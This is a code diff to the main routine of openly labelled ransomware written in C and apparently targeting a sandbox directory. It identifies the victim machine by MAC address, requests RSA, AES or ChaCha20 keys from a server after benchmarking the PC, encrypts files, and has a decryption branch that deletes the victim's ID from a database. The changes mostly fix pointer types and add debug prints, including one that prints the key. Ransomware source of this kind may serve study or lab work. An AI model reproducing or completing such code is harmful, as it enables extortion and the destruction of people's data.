@@ -80,8 +80,7 @@ int main(int argc, char const *argv[])
 {
 
     char* paths[] = {"/tmp/sandbox-ransomware/"};
-    unsigned char* id = NULL;
-    char* p_algo = NULL;
+    unsigned char* p_algo = NULL;
     unsigned char* p_iv = NULL;
     unsigned char* p_key = NULL;
     unsigned char* p_macAddress = NULL;
@@ -139,13 +138,17 @@ int main(int argc, char const *argv[])
     /* Get the identifier of the current computer */
     p_macAddress = get_identifier();
 
+    printf("[+] Identifier: %02X:%02X:%02X:%02X:%02X:%02X\n", p_macAddress[0], p_macAddress[1], p_macAddress[2], p_macAddress[3], p_macAddress[4], p_macAddress[5]);
+
     if (g_encryption)
     {
         /* Create benchmark structure to send to the server */
         benchmarkData* p_benchmarkData = benchmark_pc(p_listFileData->totalSize);
 
         /* Get the encryption key based on the benchmark */
-        p_key = (unsigned char*) get_encryption_key((char*)id, p_benchmarkData, &p_algo, (char**)&p_iv);
+        p_key = get_encryption_key(p_macAddress, p_benchmarkData, &p_algo, &p_iv);
+
+        printf("key: %s\n", p_key);
 
         printf("[+] Encryption key GET success\n");
 
@@ -153,7 +156,7 @@ int main(int argc, char const *argv[])
         {
             printf("[+] Algorithm: %s\n", p_algo);
             printf("[+] Encrypting files\n");
-            if (strncmp(p_algo, "RSA", 3) == 0)
+            if (strncmp((char*)p_algo, "RSA", 3) == 0)
             {
                 /* Save the encryption key if rsa algorithm is chosen */
                 save_key((char*)p_key, ENC_RSA_KEY_NAME);
@@ -164,7 +167,7 @@ int main(int argc, char const *argv[])
 
                 /* Free key */
                 EVP_PKEY_free(p_pubKey);
-            } else if (strncmp(p_algo, "AES", 3) == 0)
+            } else if (strncmp((char*)p_algo, "AES", 3) == 0)
             {
                 /* Encrypt files */
                 p_e_ctx = load_aes_encryption_key(p_key, p_iv);
@@ -174,7 +177,7 @@ int main(int argc, char const *argv[])
                 /* Free key and iv */
                 EVP_CIPHER_CTX_free(p_e_ctx);
                 free(p_iv);
-            } else if (strncmp(p_algo, "CHACHA20", 8) == 0)
+            } else if (strncmp((char*)p_algo, "CHACHA20", 8) == 0)
             {
                 /* Encrypt files */
                 p_e_ctx = load_chacha_encryption_key(p_key, p_iv);
@@ -200,7 +203,7 @@ int main(int argc, char const *argv[])
 
     if (g_decryption)
     {
-        p_key = (unsigned char*)get_decryption_key((char*)id, &p_algo, (char**)&p_iv);
+        p_key = get_decryption_key(p_macAddress, &p_algo, &p_iv);
 
         printf("[+] Decryption key GET success\n");
 
@@ -208,7 +211,7 @@ int main(int argc, char const *argv[])
         {
             printf("[+] Algorithm: %s\n", p_algo);
             printf("[+] Encrypting files\n");
-            if (strncmp(p_algo, "RSA", 3) == 0)
+            if (strncmp((char*)p_algo, "RSA", 3) == 0)
             {
                 /* Save the encryption key if rsa algorithm is chosen */
                 save_key((char*)p_key, DEC_RSA_KEY_NAME);
@@ -219,7 +222,7 @@ int main(int argc, char const *argv[])
 
                 /* Free key */
                 EVP_PKEY_free(p_privKey);
-            } else if (strncmp(p_algo, "AES", 3) == 0)
+            } else if (strncmp((char*)p_algo, "AES", 3) == 0)
             {
                 /* Encrypt files */
                 p_d_ctx = load_aes_decryption_key(p_key, p_iv);
@@ -229,7 +232,7 @@ int main(int argc, char const *argv[])
                 /* Free key and iv */
                 EVP_CIPHER_CTX_free(p_d_ctx);
                 free(p_iv);
-            } else if (strncmp(p_algo, "CHACHA20", 8) == 0)
+            } else if (strncmp((char*)p_algo, "CHACHA20", 8) == 0)
             {
                 /* Encrypt files */
                 p_d_ctx = load_chacha_decryption_key(p_key, p_iv);
@@ -246,6 +249,9 @@ int main(int argc, char const *argv[])
         }
 
         printf("[+] Files decrypted\n");
+
+        /* Delete id in database */
+        delete_id(p_macAddress);
 
         /* Free memory */
         free(p_key);
